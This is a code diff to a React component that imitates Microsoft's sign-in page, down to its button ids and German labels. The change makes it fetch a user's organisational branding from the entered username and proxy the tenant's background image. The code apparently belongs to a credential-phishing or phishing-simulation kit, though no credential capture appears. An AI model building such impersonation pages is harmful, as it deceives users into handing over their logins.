@@ -112,7 +112,10 @@ function UsernamePage(props: {
                       <button
                         id="idSIButton9"
                         className="win-button button_primary high-contrast-overrides button ext-button primary ext-primary"
-                        onClick={props.onSubmit}
+                        onClick={(e) => {
+                          e.preventDefault();
+                          props.onSubmit?.();
+                        }}
                       >
                         Weiter
                       </button>
@@ -368,20 +371,28 @@ export default function MSConvergedSignInPage() {
   const [password, setPassword] = useState("");
   const [page, setPage] = useState<"username" | "password">("username");
 
-  const branding = api.branding.getBranding.useQuery(
-    { username },
-    {
-      enabled: false, // Disable automatic query execution
-    },
-  );
+  const branding = api.branding.getBranding.useMutation();
 
   const onUsernameSubmit = async () => {
-    await branding.refetch();
-    setPage("password");
+    console.log("Username submitted:", username);
+    const data = await branding.mutateAsync({ username })
+    console.log("Branding Data gotten:", data);
+    
+    //setPage("password");
   };
 
+  const backgroundProxyUrl = branding.data?.branding?.backgroundImage
+    ? `/api/assetProxy?url=${encodeURIComponent(branding.data.branding.backgroundImage)}`
+    : undefined;
+
+  console.log("Branding Data:", branding.data);
+
   return (
-    <LightboxTemplateContainer signInOptions={page === "username"} footer>
+    <LightboxTemplateContainer
+      signInOptions={page === "username"}
+      footer
+      backgroundImage={backgroundProxyUrl}
+    >
       {page === "username" ? (
         <UsernamePage
           username={username}
